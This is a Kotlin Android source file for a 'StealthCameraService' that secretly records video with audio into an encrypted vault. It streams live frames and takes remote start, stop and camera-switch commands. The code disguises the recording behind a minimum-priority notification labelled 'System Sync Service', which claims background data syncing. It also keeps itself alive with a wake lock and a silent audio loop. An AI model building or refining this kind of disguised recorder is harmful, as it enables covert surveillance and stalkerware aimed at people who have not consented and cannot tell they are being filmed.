package com.stealth.evidence.ui

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Matrix
import android.media.AudioFormat
import android.media.AudioManager
import android.media.AudioTrack
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.FileOutputOptions
import androidx.camera.video.Quality
import androidx.camera.video.QualitySelector
import androidx.camera.video.Recorder
import androidx.camera.video.Recording
import androidx.camera.video.VideoCapture
import androidx.camera.video.VideoRecordEvent
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import java.io.ByteArrayOutputStream
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class StealthCameraService : LifecycleService() {
    private var wakeLock: PowerManager.WakeLock? = null
    private var audioTrack: AudioTrack? = null
    private var isPlayingSilence = false
    private lateinit var cameraExecutor: ExecutorService
    private var videoCapture: VideoCapture<Recorder>? = null
    private var recording: Recording? = null
    private var cameraProvider: ProcessCameraProvider? = null

    private lateinit var vaultManager: VaultManager
    private var currentLensFacing = CameraSelector.LENS_FACING_BACK
    private var isCameraInitialized = false

    companion object {
        // MJPEG配信用に最新フレームを保持
        @Volatile
        var latestJpeg: ByteArray? = null

        // 外部（サーバーなど）から操作するためのアクション定義
        const val ACTION_START_STANDBY = "ACTION_START_STANDBY"
        const val ACTION_START_RECORDING = "ACTION_START_RECORDING"
        const val ACTION_STOP_RECORDING = "ACTION_STOP_RECORDING"
        const val ACTION_SWITCH_CAMERA = "ACTION_SWITCH_CAMERA"
    }

    override fun onCreate() {
        super.onCreate()
        vaultManager = VaultManager(this)
        cameraExecutor = Executors.newSingleThreadExecutor()
        startForegroundServiceNotification()
        acquireWakeLock()
        startSilentAudioLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        // 送られてきたアクションに応じて処理を分岐
        when (intent?.action) {
            ACTION_START_STANDBY -> {
                if (!isCameraInitialized) {
                    startCamera(currentLensFacing)
                    isCameraInitialized = true
                }
            }
            ACTION_START_RECORDING -> {
                startRecordingToVault()
            }
            ACTION_STOP_RECORDING -> {
                stopRecordingToVault()
            }
            ACTION_SWITCH_CAMERA -> {
                switchCamera()
            }
            else -> {
                // デフォルトの起動時（指定なし）もカメラをスタンバイ状態にしておく
                if (!isCameraInitialized) {
                    startCamera(currentLensFacing)
                    isCameraInitialized = true
                }
            }
        }
        return START_STICKY
    }

    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "StealthVault::RecordingWakeLock")
        wakeLock?.acquire()
    }

    private fun startSilentAudioLoop() {
        val sampleRate = 44100
        val bufferSize = AudioTrack.getMinBufferSize(
            sampleRate,
            AudioFormat.CHANNEL_OUT_MONO,
            AudioFormat.ENCODING_PCM_16BIT
        )
        audioTrack = AudioTrack(
            AudioManager.STREAM_MUSIC,
            sampleRate,
            AudioFormat.CHANNEL_OUT_MONO,
            AudioFormat.ENCODING_PCM_16BIT,
            bufferSize,
            AudioTrack.MODE_STREAM
        )
        audioTrack?.play()
        isPlayingSilence = true

        Thread {
            val silenceBuffer = ShortArray(bufferSize)
            while (isPlayingSilence) {
                audioTrack?.write(silenceBuffer, 0, silenceBuffer.size)
            }
        }.start()
    }

    private fun startForegroundServiceNotification() {
        val channelId = "stealth_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Sync Service",
                NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("システム同期")
            .setContentText("バックグラウンドでデータを同期しています")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(1, notification)
    }

    private fun startCamera(lensFacing: Int) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            cameraProvider = cameraProviderFuture.get()
            
            val recorder = Recorder.Builder()
                .setQualitySelector(QualitySelector.from(Quality.HD))
                .build()
            videoCapture = VideoCapture.withOutput(recorder)

            val imageAnalysis = ImageAnalysis.Builder()
                .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                .build()

            imageAnalysis.setAnalyzer(cameraExecutor) { imageProxy ->
                try {
                    val bitmap = Bitmap.createBitmap(imageProxy.width, imageProxy.height, Bitmap.Config.ARGB_8888)
                    bitmap.copyPixelsFromBuffer(imageProxy.planes[0].buffer)

                    val matrix = Matrix()
                    matrix.postRotate(imageProxy.imageInfo.rotationDegrees.toFloat())
                    val rotatedBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)

                    val out = ByteArrayOutputStream()
                    rotatedBitmap.compress(Bitmap.CompressFormat.JPEG, 40, out)
                    latestJpeg = out.toByteArray()
                } catch (e: Exception) {
                    e.printStackTrace()
                } finally {
                    imageProxy.close()
                }
            }

            val cameraSelector = CameraSelector.Builder().requireLensFacing(lensFacing).build()

            try {
                cameraProvider?.unbindAll()
                cameraProvider?.bindToLifecycle(this, cameraSelector, videoCapture, imageAnalysis)
                // ★修正点：ここでは startRecording() を呼ばず、ストリーミング用のスタンバイ状態にする
                Log.d("StealthCameraService", "Camera started in STANDBY mode")
            } catch (exc: Exception) {
                Log.e("StealthCameraService", "Camera binding failed", exc)
                stopSelf()
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun switchCamera() {
        currentLensFacing = if (currentLensFacing == CameraSelector.LENS_FACING_BACK) {
            CameraSelector.LENS_FACING_FRONT
        } else {
            CameraSelector.LENS_FACING_BACK
        }
        // カメラの向きを変えるには一度バインドを解除して再起動が必要（録画中の場合は自動で停止される）
        stopRecordingToVault()
        startCamera(currentLensFacing)
    }

    @SuppressLint("MissingPermission")
    private fun startRecordingToVault() {
        if (recording != null) {
            Log.d("StealthCameraService", "Already recording to Vault")
            return
        }
        val videoCapture = this.videoCapture ?: return
        val tempFile = vaultManager.createTempVideoFile()
        val outputOptions = FileOutputOptions.Builder(tempFile).build()
        recording = videoCapture.output
            .prepareRecording(this, outputOptions)
            .withAudioEnabled()
            .start(ContextCompat.getMainExecutor(this)) { recordEvent ->
                when (recordEvent) {
                    is VideoRecordEvent.Start -> {
                        Log.d("StealthCameraService", "Recording to Vault started")
                    }
                    is VideoRecordEvent.Finalize -> {
                        if (!recordEvent.hasError()) {
                            vaultManager.finalizeVideoFile(tempFile)
                            Log.d("StealthCameraService", "Recording finalized and encrypted")
                        } else {
                            tempFile.delete()
                            Log.e("StealthCameraService", "Recording error: ${recordEvent.error}")
                        }
                    }
                    else -> {}
                }
            }
    }

    private fun stopRecordingToVault() {
        recording?.stop()
        recording = null
        Log.d("StealthCameraService", "Recording to Vault stopped")
    }

    override fun onDestroy() {
        super.onDestroy()
        stopRecordingToVault()
        cameraExecutor.shutdown()

        isPlayingSilence = false
        audioTrack?.stop()
        audioTrack?.release()
        
        latestJpeg = null

        wakeLock?.let {
            if (it.isHeld) {
                it.release()
            }
        }
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }
}
